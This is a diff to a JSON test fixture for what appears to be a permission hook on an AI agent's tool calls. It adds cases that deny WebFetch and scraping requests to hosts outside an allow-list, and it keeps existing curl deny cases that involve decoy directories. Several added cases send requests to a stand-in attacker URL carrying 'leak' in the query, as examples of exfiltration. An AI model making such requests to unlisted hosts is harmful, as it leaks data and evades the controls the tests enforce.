@@ -512,5 +512,9 @@
   {"name":"deny_nested_run_dir_decoy_bridge","reason":"forbidden","dir":"{{ELSEWHERE}}","env":{"ULTRAPOWERS_RUN_DIR":"{{ROOT}}"},"event":{"tool_name":"Bash","tool_input":{"command":"curl -s https://prod.example.com/","ultrapowers_run_dir":"{{DECOY}}"},"cwd":"{{ROOT}}"}},
   {"name":"deny_nested_cwd_decoy_bridge","reason":"is outside the project","dir":"{{ELSEWHERE}}","env":{"ULTRAPOWERS_RUN_DIR":"{{ROOT}}"},"event":{"tool_name":"Bash","tool_input":{"command":"curl -s https://prod.example.com/","cwd":"{{DECOY}}"},"cwd":"{{ROOT}}"}},
   {"name":"deny_nested_run_dir_decoy_direct","reason":"forbidden","dir":"{{ELSEWHERE}}","event":{"tool_name":"Bash","tool_input":{"command":"curl -s https://prod.example.com/","ultrapowers_run_dir":"{{DECOY}}"},"cwd":"{{ROOT}}"}},
-  {"name":"deny_nested_cwd_decoy_direct","reason":"is outside the project","dir":"{{ELSEWHERE}}","event":{"tool_name":"Bash","tool_input":{"command":"curl -s https://prod.example.com/","cwd":"{{DECOY}}"},"cwd":"{{ROOT}}"}}
+  {"name":"deny_nested_cwd_decoy_direct","reason":"is outside the project","dir":"{{ELSEWHERE}}","event":{"tool_name":"Bash","tool_input":{"command":"curl -s https://prod.example.com/","cwd":"{{DECOY}}"},"cwd":"{{ROOT}}"}},
+  {"name":"deny_webfetch_unlisted","reason":"is not in qa.hosts.allowed","dir":"{{DECOY}}","event":{"tool_name":"WebFetch","tool_input":{"url":"https://evil.example.net/x?q=leak","prompt":"x"}}},
+  {"name":"deny_webfetch_unlisted_with_list","reason":"is not in qa.hosts.allowed","event":{"tool_name":"WebFetch","tool_input":{"url":"https://evil.example.net/x?q=leak","prompt":"x"}}},
+  {"name":"deny_url_tool_unlisted_empty_list","reason":"is not in qa.hosts.allowed","dir":"{{DECOY}}","event":{"tool_name":"mcp__Firecrawl__firecrawl_scrape","tool_input":{"url":"https://docs.example.org/page"}}},
+  {"name":"allow_webfetch_listed","event":{"tool_name":"WebFetch","tool_input":{"url":"http://localhost:3000/page","prompt":"x"}}}
 ]
